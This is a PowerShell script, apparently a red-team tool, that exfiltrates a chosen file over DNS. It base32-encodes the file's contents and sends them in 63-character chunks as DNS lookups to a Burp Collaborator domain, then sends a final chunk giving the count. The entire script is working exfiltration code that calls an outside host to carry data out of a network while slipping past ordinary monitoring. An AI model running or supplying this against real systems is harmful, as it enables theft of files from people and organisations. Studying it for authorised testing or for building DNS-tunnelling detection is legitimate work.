[CmdletBinding()]
param(
    [parameter(
        Mandatory = $true, HelpMessage="Burp Collaborator address")]
    $collabDomain,
	[parameter(
        Mandatory = $true, HelpMessage="File to exfiltrate")]
    $exfilFile
)
$characterSet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
$dnsFlag="nspi";
$amountFlag="amount";

#Encodes data in to base32
Function Encode-Base32($data) {
  #Convert data to 8-bit binary chunks
  $binaryData = [System.Text.Encoding]::UTF8.GetBytes($data) | %{ [System.Convert]::ToString($_,2).PadLeft(8,'0') }
  #Concatenate into one string
  $binaryData = $binaryData -join ""
  #Split into 5 bit chunks
  $binaryData = $binaryData -split '(.{5})' | ? {$_} | % {$_.PadRight(5,'0')}
  $encodedData = ""
  #Convert each 5-bit chunk into an ASCII character
  foreach($chunk in $binaryData) {
    $value = [System.Convert]::ToInt32($chunk, 2)
    $encodedData += $characterSet[$value]
  }
  return $encodedData
}

#Read the contents of the file to exfiltrate
$exfilData = Get-Content $exfilFile | Out-String

#Convert data to base32
$exfilData = Encode-Base32 $exfilData

#Split base32-encoded data into 63 character chunks
$splitData = $exfilData -split '(.{63})' | ? {$_}
$counter=0

#Perform the DNS query for each 63 character chunk
foreach($word in $splitData) {
    $chunk = "$dnsFlag.$word.$counter.$collabDomain"
    Write-Verbose "Tunneling chunk $counter : $chunk"
    [Net.DNS]::GetHostEntry($chunk) | Out-Null
    $counter++
}

#Tell the tunnel how much data it should expect
$amountChunk = "$dnsFlag.$amountFlag.$counter.$collabDomain"
Write-Verbose "Tunneling amount chunk: $amountChunk"
[Net.DNS]::GetHostEntry($amountChunk) | Out-Null
